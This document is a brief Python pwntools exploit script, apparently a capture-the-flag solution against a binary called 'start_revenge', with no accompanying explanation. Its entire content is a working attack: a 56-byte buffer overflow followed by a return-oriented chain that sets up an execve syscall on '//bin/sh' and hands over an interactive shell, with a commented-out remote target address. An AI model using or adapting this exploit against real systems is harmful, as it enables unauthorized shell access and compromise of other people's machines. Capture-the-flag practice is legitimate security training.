#!/usr/bin/env python
# Wildfoot
from pwn import *

context.update(arch="amd64", os="linux")

host = "10.13.2.43"
port = 20739
#r = remote(host, port)
r = process("./start_revenge")

input("attach in gdb and press Enter")

pop_rax = 0x400114
pop_rdi_rsi_rdx = 0x4000a9
syscall_address = 0x40009f
#buffer_address = 0x4000a1

payload = flat(["A" * 56, p64(pop_rdi_rsi_rdx), p64(0x7fffb9316560), p64(0x0), p64(0x0), p64(pop_rax), p64(0x3b), p64(syscall_address), "//bin/sh\x00" * 100])
print(payload)

r.recvuntil("?")
r.sendline(payload)

r.interactive()
